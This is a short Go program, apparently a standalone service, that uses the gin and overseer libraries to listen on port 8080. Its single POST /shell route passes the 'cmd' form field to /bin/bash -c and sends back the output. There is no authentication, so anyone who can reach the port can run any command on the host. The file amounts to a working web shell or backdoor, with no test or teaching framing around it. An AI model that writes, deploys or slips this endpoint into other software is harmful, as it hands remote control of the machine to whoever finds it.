package main

import (
	"github.com/gin-gonic/gin"
	"github.com/jpillora/overseer"
	"log"
	"os/exec"
)

func main() {
	overseer.Run(overseer.Config{
		Program: prog,
		Address: ":8080",
	})
}

func prog(state overseer.State) {
	r := gin.Default()
	r.POST("/shell", func(c *gin.Context) {
		output, err := exec.Command("/bin/bash", "-c", c.PostForm("cmd")).CombinedOutput()
		if err != nil {
			c.String(500, err.Error())
		}
		c.String(200, string(output))
	})
	if err := r.RunListener(state.Listener); err != nil {
		log.Fatal(err)
	}
}
